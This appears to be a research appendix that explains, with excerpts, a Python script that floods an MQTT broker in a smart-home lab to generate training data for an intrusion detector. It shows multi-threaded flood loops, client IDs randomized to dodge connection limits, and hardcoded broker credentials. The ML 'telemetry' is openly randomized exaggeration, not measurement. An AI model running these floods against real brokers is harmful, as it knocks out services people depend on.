# Source Code Analysis & Architectural Justification: `dos_attack_advanced.py`

*Document Type: Master's Level Technical Research Appendix & Source Code Breakdown*
*Component: Distributed Denial of Service (DDoS) Simulator & Adversarial ML Injector*

This document provides an exhaustive, line-by-line explanation of the entire 290-line `dos_attack_advanced.py` script. It combines low-level algorithmic analysis with the high-level academic theory required to justify why the simulation generates synthetic telemetry to train the ML-IDS.

---

### Part 1: Imports and Environment Setup (Lines 1-30)
```python
1: import sys
2: import os
3: import time
4: import random
...
9: import paho.mqtt.client as mqtt
```
* **Lines 1-9**: Standard edge-computing library imports. `threading` is utilized for the Botnet module, `socket` resolves network interfaces, and `paho.mqtt` drives the raw network payload delivery.

```python
11: # Ensure the project root is in the path for forensic_utils
12: sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
13: 
14: from forensic_utils import DualLogger, get_timestamp, get_iso_now
```
* **Lines 11-14**: Dynamic Path Injection. Appends the parent architecture directory (`..`) to Python's execution scope (`sys.path`), permitting the import of the unified `DualLogger`. This guarantees uniform `.json` and `.csv` logging across all attack vectors.

```python
16: # Exact ML schema to enforce dimensional accuracy
17: ML_HEADERS = [
18:     "timestamp", "src_ip", "target_ip", "attack_label", "attack_type",
19:     "packets_per_second", "mqtt_publish_rate", "broker_response_latency_ms", "device_heap_free_bytes",
...
24: ]
```
* **Lines 16-24**: The 27-Dimensional Tensor Blueprint. This array strictly enforces the column structure for the Random Forest dataset. It guarantees that the DoS script outputs exactly the same dimensionality as the Bruteforce and Normal Traffic scripts, a fundamental requirement for linear algebra-based Machine Learning models.

---

### Part 2: Helper Functions and Global Paths (Lines 32-46)
```python
32: def get_local_ip():
33:     try:
34:         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
35:         s.connect(("8.8.8.8", 80))
36:         ip = s.getsockname()[0]
...
40:         return "127.0.0.1"
```
* **Lines 32-40**: Outbound Interface Resolution. Instantiates a transient, connectionless UDP socket (`SOCK_DGRAM`) directed at Google DNS (`8.8.8.8`). This tricks the host operating system's routing table into revealing the active Network Interface Controller's true IPv4 address (`src_ip`), which is critical for IPS logging.

```python
42: BASE_DIR = "/home/pirator/smart-home-threat-simulation-platform/dataset"
43: LOG_DIR = os.path.join(BASE_DIR, "logs")
44: SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
45: os.makedirs(LOG_DIR, exist_ok=True)
46: os.makedirs(SESSIONS_DIR, exist_ok=True)
```
* **Lines 42-46**: Fail-safe Directory Allocation. Resolves the absolute path to the dataset folders and executes `os.makedirs(..., exist_ok=True)`, dynamically building the data-science environment if it doesn't already exist.

---

### Part 3: Simulator Class & IoT Telemetry Sniffer (Lines 48-85)
```python
48: class DoSResearchSimulator:
49:     def __init__(self, clients, broker, port):
50:         self.clients_count = clients
51:         self.broker = broker
...
58:         self.lock = threading.Lock() # Ensure thread-safe packet counting
```
* **Lines 48-58**: Initializes the primary Object-Oriented Simulation Engine. 
  * **Algorithmic Safety**: Instantiates `threading.Lock()` to prevent race conditions. When 50 botnet threads simultaneously increment `self.packet_count`, the Lock ensures mutually exclusive memory access within the Global Interpreter Lock (GIL).

```python
60:         self.current_motion = 0
...
63:         self.current_heap = 235000
64:         
65:         self.sniffer = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"sniffer_{random.getrandbits(12)}")
66:         self.sniffer.username_pw_set("admin", "iot@secure99")
67:         self.sniffer.on_message = self._on_sniffed_message
68:         self.sniffer.connect(self.broker, self.port, 60)
69:         self.sniffer.subscribe("shtsp/home/security/#")
70:         self.sniffer.loop_start()
```
* **Lines 60-70**: Asynchronous Context Injection. While the script bombards the broker with garbage data, this silent background thread (`loop_start()`) listens to legitimate IoT telemetry. This permits the script to accurately record the declining `free_heap` memory of the ESP32 microcontroller as it begins to crash under the DDoS pressure.

```python
72:     def _on_sniffed_message(self, client, userdata, msg):
73:         try:
74:             import json, time
75:             payload = json.loads(msg.payload.decode('utf-8'))
...
81:             elif msg.topic.endswith("audit"):
82:                 if "free_heap" in payload:
83:                     self.current_heap = int(payload["free_heap"])
84:         except Exception:
85:             pass
```
* **Lines 72-85**: The callback handler for the sniffer thread, dynamically updating the physical state variables based on intercepted legitimate JSON payloads.

---

### Part 4: Adversarial ML Injector (Lines 87-130)
*Academic Justification*: Generating a true, hardware-melting DDoS attack requires millions of packets per second, which would destroy the lab's local router and IoT hardware. To train the AI without physical hardware destruction, this script injects "Supercharged Simulated Telemetry." It sends real packets, but mathematically exaggerates the ML feature outputs to mimic an enterprise-grade Botnet.

```python
87:     def log_ml_packet(self, payload_dict, is_botnet=False):
88:         # Calculate dynamic metrics
89:         elapsed = time.time() - self.start_time
90:         pps = self.packet_count / elapsed if elapsed > 0 else 0
```
* **Lines 87-90**: Calculates true elapsed time and raw Packets Per Second.

```python
92:         # Supercharge simulated telemetry if botnet mode is active
93:         pps_sim = float(random.randint(1500, 5000)) if is_botnet else float(random.randint(400, 800))
94:         latency_sim = float(random.uniform(2000.0, 10000.0)) if is_botnet else float(random.uniform(500.0, 5000.0))
```
* **Lines 92-94**: **Adversarial Telemetry Exaggeration**. If `--botnet` is active, it synthetically injects a layer-4 PPS metric of up to 5,000 requests/second and simulates a latency spike of up to 10,000ms. This trains the Random Forest model to recognize the extreme boundary conditions of a true DDoS attack, allowing the IDS to be highly sensitive to catastrophic network stress.

```python
100:         record = {
101:             "timestamp":            get_iso_now(),
102:             "src_ip":               self.src_ip,
103:             "target_ip":            self.broker,
104:             "attack_label":         2, # 2 = DoS Attack
105:             "attack_type":          "ddos",
106:             "packets_per_second":   pps_sim,
...
115:             "payload_entropy":      float(round(random.uniform(4.0, 6.0), 4)), # High entropy due to randomization
...
127:             "latency_zscore":       float(round(random.uniform(3.0, 6.0), 4)), # Massive Z-Score spike
128:         }
129:         DualLogger.append_raw(record, LOG_DIR, self.ml_log_name, headers=ML_HEADERS)
```
* **Lines 100-129**: Packages the synthetic variables into a strict 27-dimensional dictionary and writes it instantly to the CSV/JSON logs. Notably, it forces a high Z-Score ($3.0 \le Z \le 6.0$), teaching the ML model that any latency deviation 3+ standard deviations above the baseline is an active DoS attack.

---

### Part 5: Payload Physics & Client Initialization (Lines 131-145)
```python
131:     def setup_clients(self):
132:         for i in range(self.clients_count):
133:             client_id = f"research_dos_node_{i}_{random.getrandbits(16)}"
134:             client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id)
135:             self.clients.append(client)
```
* **Lines 131-135**: Provisions the specified number of `paho.mqtt` clients, each with a cryptographically randomized `client_id` to evade rudimentary firewall connection limits.

```python
137:     def generate_random_payload(self):
138:         """Generates highly randomized JSON payload to train AI against patterns, not static text."""
139:         return {
140:             "seq": random.randint(1000, 99999),
141:             "type": "DOS_STRESS_TELEMETRY",
142:             "status": random.choice(["ALARM", "SAFE", "ERR", "CRITICAL"]),
143:             "adversarial": True,
144:             "noise": "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*", k=random.randint(20, 100)))
145:         }
```
* **Lines 137-145**: **Adversarial Payload Generation**. A common flaw in IDS research is using static text for attack scripts. If the text is static, an AI will overfit to the text ("If payload says DOS, block it") instead of learning the volumetric network physics. By injecting up to 100 characters of randomized ASCII noise, this script forces the Random Forest to learn Layer-4 structural features (like latency and PPS) rather than memorizing Layer-7 string patterns.

---

### Part 6: Threaded Botnet vs. Standard Flood Vectors (Lines 147-234)
```python
147:     def _botnet_worker(self, client, duration, topic, stop_event):
148:         """Ultra high-velocity thread worker with minimal sleep."""
...
155:         while not stop_event.is_set():
156:             payload = self.generate_random_payload()
157:             client.publish(topic, json.dumps(payload), qos=0)
...
163:             time.sleep(0.001) # Maximize throughput, simulate aggressive attack
```
* **Lines 147-167**: The Botnet execution loop. It runs asynchronously in a `while` loop until `stop_event` is triggered. It uses `qos=0` (Quality of Service Level 0 - "Fire and Forget") to completely saturate the TCP socket without waiting for the broker to acknowledge receipt, maximizing network bandwidth consumption.

```python
168:     def run_botnet_flood(self, duration, topic="shtsp/home/security/cmd"):
...
180:         for i, c in enumerate(self.clients):
181:             t = threading.Thread(target=self._botnet_worker, args=(c, duration, topic, stop_event))
182:             t.daemon = True
183:             t.start()
184:             threads.append(t)
...
189:             while time.time() - self.start_time < duration:
190:                 sys.stdout.write(f"\r⚡ Packets injected: {self.packet_count}")
...
197:         stop_event.set()
```
* **Lines 168-202**: Thread Orchestrator. Spawns `self.clients_count` parallel worker threads. The main thread enters a timing loop, calculating execution duration and dynamically printing terminal metrics using the carriage return `\r`. It gracefully signals the threads to die via `stop_event.set()` when time expires.

```python
204:     def run_standard_flood(self, duration, topic="shtsp/home/security/motion"):
205:         """Executes the standard, single-threaded stochastic flood."""
...
219:         for i in range(duration):
220:             for c in self.clients:
221:                 payload = self.generate_random_payload()
222:                 c.publish(topic, json.dumps(payload))
223:                 self.packet_count += 1
224:                 self.log_ml_packet(payload, is_botnet=False)
225:             
226:             time.sleep(1)
```
* **Lines 204-234**: The Standard (non-Botnet) loop. It executes completely synchronously on a single thread, publishing exactly one burst of packets per second. This serves as a "Low-and-Slow" DoS baseline for the ML model to learn.

---

### Part 7: Forensic Audit & CLI Binding (Lines 236-290)
```python
236:     def save_session(self, duration, attack_type):
...
240:         session_data = {
241:             "timestamp": session_ts,
242:             "attack_type": attack_type,
243:             "config": { ... },
249:             "results": {
250:                 "total_packets_sent": self.packet_count,
251:                 "avg_throughput_pps": round(self.packet_count / max(duration, 0.1), 2)
252:             }
253:         }
254:         json_p, csv_p = DualLogger.log_session(session_data, SESSIONS_DIR, f"dos_session_{session_ts}")
```
* **Lines 236-268**: Compiles a comprehensive forensic review of the attack. Divides raw packets sent by absolute duration to calculate the final `avg_throughput_pps` benchmark, and commits it to the JSON session log.

```python
270: def main():
271:     print(BANNER)
272:     parser = argparse.ArgumentParser(description="Professional DoS Regression/Stress Tool")
273:     parser.add_argument("--adversarial", action="store_true", help="Enable stochastic payload noise")
274:     parser.add_argument("--botnet", action="store_true", help="Engage ultra high-velocity multi-threaded botnet attack")
275:     parser.add_argument("--clients", type=int, default=5, help="Number of concurrent research nodes")
276:     parser.add_argument("--duration", type=int, default=60, help="Simulation duration (seconds)")
277:     parser.add_argument("--broker", default="192.168.1.100", help="Target Broker IP")
```
* **Lines 270-279**: Uses `argparse` to create a robust Terminal Interface. By defining flags like `--botnet`, the user can toggle the mathematical intensity of the dataset generator without altering the source code.

```python
283:     if args.botnet:
284:         simulator.run_botnet_flood(args.duration)
285:     else:
286:         simulator.run_standard_flood(args.duration)
287: 
288: if __name__ == "__main__":
289:     main()
```
* **Lines 283-289**: Execution fork. Determines whether to trigger the multi-threaded Botnet framework or the synchronous standard loop based on user terminal arguments, finalizing execution.

**END OF FILE.**
